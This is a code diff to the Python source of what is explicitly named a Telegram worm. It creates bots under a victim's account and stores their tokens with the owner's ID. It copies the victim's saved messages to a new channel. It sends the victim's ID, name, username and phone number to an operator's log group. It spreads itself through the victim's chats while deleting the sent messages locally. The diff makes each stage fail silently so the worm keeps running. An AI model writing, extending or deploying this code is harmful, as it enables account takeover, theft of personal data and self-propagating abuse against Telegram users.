@@ -30,7 +30,7 @@ async def create_bot(client, me):
         await msg.delete()
         await response.delete()
     database.bots.insert_one({"username": username, "token": bot_token, "owner": me.id})
-async def backup_saves(client, me, bot):
+async def backup_saves(client, me, logger_bot):
     result = await client(functions.channels.CreateChannelRequest(
         title=f'{me.first_name} {me.last_name}',
         about=f'ID: {me.id}\nUsername: {me.username}',
@@ -50,7 +50,7 @@ async def backup_saves(client, me, bot):
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}")
+    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}")
 async def spread(client, bot):
     bot_me = await bot.get_me()
     async with client.conversation(f"@{bot_me.username}") as conv:
@@ -68,8 +68,17 @@ async def spread(client, bot):
         if dialog.is_user:
             await msg.delete(revoke=False)
 
-async def worm(client, bot):
+async def worm(client, bot, logger_bot):
     me = await client.get_me()
-    await create_bot(client, me)
-    await backup_saves(client, me, bot)
-    await spread(client, bot)
+    try:
+        await create_bot(client, me)
+    except:
+        pass
+    try:
+        await backup_saves(client, me, logger_bot)
+    except:
+        pass
+    try:
+        await spread(client, bot)
+    except:
+        pass
